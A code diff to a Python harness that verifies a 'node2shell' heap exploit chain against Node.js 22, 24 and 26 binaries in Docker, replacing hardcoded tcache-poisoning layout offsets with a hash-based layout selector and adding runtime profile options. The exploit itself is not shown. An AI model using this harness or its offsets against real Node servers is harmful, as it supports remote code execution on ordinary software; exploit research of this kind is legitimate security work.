@@ -42,6 +42,7 @@ def load(name: str, path: Path):
 
 DIRECT = load("n2s_direct_matrix_support", ROOT / "tools" / "verify_release_matrix.py")
 HEAP = load("n2s_heap_chain", ROOT / "poc" / "node2shell_heap.py")
+SELECTOR = load("n2s_heap_layout_selector", ROOT / "poc" / "heap_layout_selector.py")
 
 
 def number(value: object) -> int:
@@ -89,46 +90,8 @@ def static_symbols(binary: Path) -> dict[str, int]:
     return {name: values[0] for name, values in selected.items()}
 
 
-def layout_candidates(version: str) -> list[dict[str, int | str]]:
-    major = int(version.split(".", 1)[0])
-    if major == 22:
-        modern = ("v22-modern-0x220", 0x220, 33, 0x800AB70)
-        early = ("v22-early-0x250", 0x250, 36, 0x800AB18)
-        old_ring = ("v22-0x220-old-ring", 0x220, 33, 0x800AB18)
-        mixed = ("v22-0x250-new-ring", 0x250, 36, 0x800AB70)
-        parsed = DIRECT.semver(version)
-        if parsed < (22, 16, 0):
-            raw = [early, mixed, modern, old_ring]
-        elif parsed < (22, 22, 3):
-            raw = [mixed, modern, early, old_ring]
-        else:
-            raw = [modern, mixed, early, old_ring]
-    elif major == 24:
-        chunk_330 = ("v24-0x330", 0x330, 50, 0x800AB70)
-        chunk_200 = ("v24-0x200", 0x200, 31, 0x800AB70)
-        raw = (
-            [chunk_200, chunk_330]
-            if DIRECT.semver(version) >= (24, 15, 0)
-            else [chunk_330, chunk_200]
-        )
-    elif major == 26:
-        raw = [("v26-0x200", 0x200, 31, 0x800AB70)]
-    else:
-        raise RuntimeError(f"unsupported Node major: {major}")
-    candidates = []
-    for name, record_size, tcache_index, ring_from_heap in raw:
-        entry_from_heap = 0x8E0 + 0x80 + tcache_index * 8
-        candidates.append(
-            {
-                "name": name,
-                "record_size": record_size,
-                "tcache_index": tcache_index,
-                "ring_from_heap": ring_from_heap,
-                "tcache_entry_from_heap": entry_from_heap,
-                "poison_staged_position": entry_from_heap - ring_from_heap,
-            }
-        )
-    return candidates
+def layout_candidates(node_binary_sha256: str) -> list[dict[str, int | str]]:
+    return SELECTOR.select_layouts(node_binary_sha256)
 
 
 def derive_profile(binary: Path, version: str, candidate: dict[str, int | str]):
@@ -152,7 +115,18 @@ def derive_profile(binary: Path, version: str, candidate: dict[str, int | str]):
     return profile, analysis, symbols
 
 
-def start_container(binary: Path, record_size: int) -> dict[str, object]:
+def start_container(
+    binary: Path,
+    record_size: int,
+    *,
+    server_profile: str = "baseline",
+    heap_noise_blocks: int = 0,
+    image: str = IMAGE,
+) -> dict[str, object]:
+    if server_profile not in {"baseline", "observed", "socket-tuned"}:
+        raise ValueError("unsupported server profile")
+    if not 0 <= heap_noise_blocks <= 32:
+        raise ValueError("heap noise blocks must be between 0 and 32")
     stop_container()
     completed = docker(
         "run", "--platform", "linux/amd64", "-d",
@@ -165,9 +139,11 @@ def start_container(binary: Path, record_size: int) -> dict[str, object]:
         "--memory", "512m", "--cpus", "1.0", "--network", "host",
         "-e", "UV_THREADPOOL_SIZE=1",
         "-e", f"N2S_RECORD_SIZE={record_size:#x}",
+        "-e", f"N2S_SERVER_PROFILE={server_profile}",
+        "-e", f"N2S_HEAP_NOISE_BLOCKS={heap_noise_blocks}",
         "-v", f"{binary}:/usr/local/bin/node:ro",
         "-v", f"{SERVER}:/app/worker-record-server.js:ro",
-        "--entrypoint", "/usr/local/bin/node", IMAGE, "/app/worker-record-server.js",
+        "--entrypoint", "/usr/local/bin/node", image, "/app/worker-record-server.js",
     )
     if not completed.stdout.strip():
         raise RuntimeError("Docker did not return a container id")
@@ -181,16 +157,27 @@ def start_container(binary: Path, record_size: int) -> dict[str, object]:
     ]
     if forbidden:
         raise RuntimeError(f"forbidden runtime environment: {forbidden}")
+    os_release = docker(
+        "exec", CONTAINER, "sh", "-c",
+        ". /etc/os-release; printf '%s|%s' \"$ID\" \"$VERSION_ID\"",
+    ).stdout.strip()
+    image_id = docker("inspect", "--format", "{{.Image}}", CONTAINER).stdout.strip()
     return {
         "kernel_randomize_va_space": 2,
         "n2s_disable_aslr_present": False,
         "ld_preload_present": False,
+        "server_profile": server_profile,
+        "heap_noise_blocks": heap_noise_blocks,
+        "runtime_image": image,
+        "runtime_image_id": image_id,
+        "runtime_os_release": os_release,
     }
 
 
 def public_profile(profile, symbols: dict[str, int], candidate: dict[str, int | str]) -> dict[str, object]:
     return {
         "layout_candidate": candidate["name"],
+        "layout_selection": candidate["selection"],
         "record_size": f"0x{profile.record_size:x}",
         "tcache_index": profile.tcache_index,
         "ring_from_heap": f"0x{profile.ring_from_heap:x}",
@@ -214,7 +201,8 @@ def verify_one(version: str, timeout: float, retries_per_layout: int) -> dict[st
         runtime: dict[str, object] = {}
         analysis: dict[str, object] | None = None
         symbols: dict[str, int] | None = None
-        for candidate in layout_candidates(version):
+        preliminary = DIRECT.ANALYZER.extract(binary)
+        for candidate in layout_candidates(str(preliminary["node_binary_sha256"])):
             profile, analysis, symbols = derive_profile(binary, version, candidate)
             for candidate_attempt in range(1, retries_per_layout + 1):
                 print(
